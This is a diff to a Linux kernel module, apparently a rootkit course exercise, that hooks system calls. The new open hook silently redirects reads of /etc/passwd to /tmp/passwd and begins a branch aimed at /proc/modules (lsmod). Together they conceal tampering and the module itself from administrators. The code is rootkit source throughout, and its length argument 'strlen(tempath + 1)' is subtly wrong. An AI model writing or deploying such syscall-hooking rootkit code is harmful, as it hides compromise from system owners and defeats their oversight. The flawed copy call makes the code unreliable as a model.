@@ -54,8 +54,16 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return 0;
+  const char *originpath = "/etc/passwd";
+  const char *tempath = "/tmp/passwd";
+  const char *modpath = "/proc/modules";
+
+  if (strcmp(pathname, originpath) == 0) {
+    copy_to_user(pathname, tempath, strlen(tempath + 1));
+  } else if (strcmp(pathname, modpath) == 0) { // lsmod
+  }
+
+  return original_open(pathname, flags);
 }
 
 /* Own version of getdents */
@@ -96,7 +104,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
 }
 
 /* Own version of read */
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) { return 0; }
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
+  return original_read(fd, buf, count);
+}
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
